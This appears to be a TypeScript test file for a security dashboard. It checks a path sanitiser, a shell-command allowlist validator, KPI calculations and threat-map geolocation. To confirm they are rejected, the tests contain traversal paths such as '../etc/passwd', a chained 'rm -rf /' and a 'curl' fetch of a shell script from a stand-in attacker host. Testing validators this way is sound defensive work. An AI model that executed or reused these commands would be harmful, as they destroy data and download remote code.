import test from 'node:test';
import assert from 'node:assert/strict';
import {
  buildThreatRadarGeoClusters,
  computeExecutiveKpis,
  resolveTelemetryGeoCoordinates,
  sanitizeWorkspacePath,
  validateRestrictedShellScript,
} from './os-compiler-utils';
import {
  INITIAL_AGENTS,
  INITIAL_EVENTS,
  INITIAL_INCIDENTS,
  INITIAL_IOCS,
  INITIAL_NETWORK_NODES,
} from './initial-data';

test('HF-CDF OS, Compiler & Executive Intelligence Engine', async (t) => {
  await t.test('sanitizes valid workspace file paths and rejects traversal attacks', () => {
    assert.equal(sanitizeWorkspacePath('analytics/risk_model.py'), 'analytics/risk_model.py');
    assert.equal(sanitizeWorkspacePath('/scripts\\probe.ts'), 'scripts/probe.ts');

    assert.throws(() => sanitizeWorkspacePath('../etc/passwd'), /Unsafe workspace path/);
    assert.throws(() => sanitizeWorkspacePath('dir/../../secret.txt'), /Unsafe workspace path/);
    assert.throws(() => sanitizeWorkspacePath(''), /Invalid workspace path/);
  });

  await t.test('enforces allowlist and metacharacter isolation on diagnostic shell commands', () => {
    assert.equal(validateRestrictedShellScript('uname -a\ndf -h').valid, true);
    assert.equal(validateRestrictedShellScript('ps -eo pid,comm').valid, true);

    const blockedChain = validateRestrictedShellScript('uname -a; rm -rf /');
    assert.equal(blockedChain.valid, false);

    const blockedBinary = validateRestrictedShellScript('curl http://evil.example/shell.sh');
    assert.equal(blockedBinary.valid, false);
  });

  await t.test('computes deterministic executive KPIs from live incidents, agents, IoCs, and OS state', () => {
    const kpi = computeExecutiveKpis({
      incidents: INITIAL_INCIDENTS,
      agents: INITIAL_AGENTS,
      iocs: INITIAL_IOCS,
      nodes: INITIAL_NETWORK_NODES,
      events: INITIAL_EVENTS,
      resources: {
        hostname: 'hf-cdf-core',
        platform: 'linux',
        arch: 'x64',
        kernelRelease: '6.8.0',
        nodeVersion: 'v22.0.0',
        cpuCores: 4,
        loadAvg1m: 0.4,
        loadAvg5m: 0.3,
        loadAvg15m: 0.2,
        cpuUtilizationPct: 10,
        totalMemoryMb: 8192,
        usedMemoryMb: 2048,
        memoryUtilizationPct: 25,
        processRssMb: 120,
        diskTotalGb: 50,
        diskUsedGb: 10,
        diskUtilizationPct: 20,
        uptimeSeconds: 3600,
        activeWorkers: 1,
        maxWorkers: 4,
        queueDepth: 0,
        capturedAt: new Date().toISOString(),
      },
      services: [
        {
          id: 'svc-1',
          name: 'api-gateway',
          version: '1.0.0',
          status: 'healthy',
          pid: 100,
          dependencies: [],
          accessPolicy: 'zero-trust',
          errorCount: 0,
          uptimeSeconds: 3600,
          lastHealthCheck: new Date().toISOString(),
        },
      ],
    });

    assert.ok(kpi.systemHealthPct >= 70 && kpi.systemHealthPct <= 100);
    assert.ok(kpi.containmentProgressPct >= 0 && kpi.containmentProgressPct <= 100);
    assert.ok(kpi.threatMitigationEfficiencyPct >= 50 && kpi.threatMitigationEfficiencyPct <= 100);
    assert.equal(kpi.series.length, 6);
    assert.equal(kpi.series[5].label, 'LIVE');
  });

  await t.test('generates valid D3 geographic threat clusters and great-circle arcs', () => {
    const radar = buildThreatRadarGeoClusters({
      incidents: INITIAL_INCIDENTS,
      events: INITIAL_EVENTS,
      nodes: INITIAL_NETWORK_NODES,
    });

    assert.ok(radar.clusters.length >= 6);
    assert.ok(radar.arcs.length >= 4);
    for (const cluster of radar.clusters) {
      assert.ok(cluster.lat >= -90 && cluster.lat <= 90);
      assert.ok(cluster.lng >= -180 && cluster.lng <= 180);
    }
    for (const arc of radar.arcs) {
      assert.equal(arc.sourceCoords.length, 2);
      assert.equal(arc.targetCoords.length, 2);
    }
  });

  await t.test('resolves real-world geographic coordinates accurately for known endpoints and IP hashes', () => {
    const ashburn = resolveTelemetryGeoCoordinates('vault.ashburn.cluster.internal');
    assert.ok(ashburn.coords[0] < -70 && ashburn.coords[0] > -80);
    assert.ok(ashburn.coords[1] > 35 && ashburn.coords[1] < 42);

    const frankfurt = resolveTelemetryGeoCoordinates('185.199.110.153', 'Germany');
    assert.ok(frankfurt.coords[0] > 5 && frankfurt.coords[0] < 12);
    assert.ok(frankfurt.coords[1] > 48 && frankfurt.coords[1] < 53);

    const tokyo = resolveTelemetryGeoCoordinates('ap-northeast-1-gpu-vault');
    assert.ok(tokyo.coords[0] > 130 && tokyo.coords[0] < 145);
    assert.ok(tokyo.coords[1] > 30 && tokyo.coords[1] < 40);

    const unknownIp = resolveTelemetryGeoCoordinates('198.51.100.42');
    assert.equal(unknownIp.coords.length, 2);
    assert.ok(unknownIp.coords[0] >= -180 && unknownIp.coords[0] <= 180);
    assert.ok(unknownIp.coords[1] >= -90 && unknownIp.coords[1] <= 90);
  });

  await t.test('synthesizes live attack vectors from live ongoing attacks with telemetry details', () => {
    const mockLiveAttacks = [
      {
        id: 'atk-test-1',
        title: 'BGP Hijack & TLS Interception on Sovereign Inference Core',
        adversaryGroup: 'APT-29 COZY BEAR',
        attackVector: 'BGP Hijack & TLS Interception',
        sourceIp: '194.26.29.112',
        sourceCountry: 'Eastern Europe',
        targetName: 'Sovereign Inference Core',
        targetAssetId: 'cluster-ashburn-01',
        targetSector: 'Defense / AI Core',
        targetRegion: 'Ashburn, VA',
        severity: 'critical' as const,
        phase: 'active_exploitation' as const,
        penetrationPct: 78,
        aiShieldPct: 22,
        assignedAgentId: 'agent-sentinel',
        assignedAgentName: 'Sentinel AI',
        mitreTechnique: 'T1557 · Adversary-in-the-Middle',
        startedAt: new Date(Date.now() - 300000).toISOString(),
        updatedAt: new Date().toISOString(),
        logs: [],
      },
    ];

    const radar = buildThreatRadarGeoClusters({
      incidents: INITIAL_INCIDENTS,
      events: INITIAL_EVENTS,
      nodes: INITIAL_NETWORK_NODES,
      liveAttacks: mockLiveAttacks,
    });

    const liveArc = radar.arcs.find((a) => a.id === 'live-arc-atk-test-1');
    assert.ok(liveArc, 'Live attack vector arc must be synthesized');
    assert.equal(liveArc?.severity, 'critical');
    assert.ok(liveArc?.sourceLabel?.includes('APT-29'));
    assert.equal(liveArc?.targetLabel, 'Sovereign Inference Core');
    assert.ok(liveArc?.sourceCoords && liveArc.sourceCoords.length === 2);
    assert.ok(liveArc?.targetCoords && liveArc.targetCoords.length === 2);
    assert.equal(liveArc?.status, 'active');
  });
});

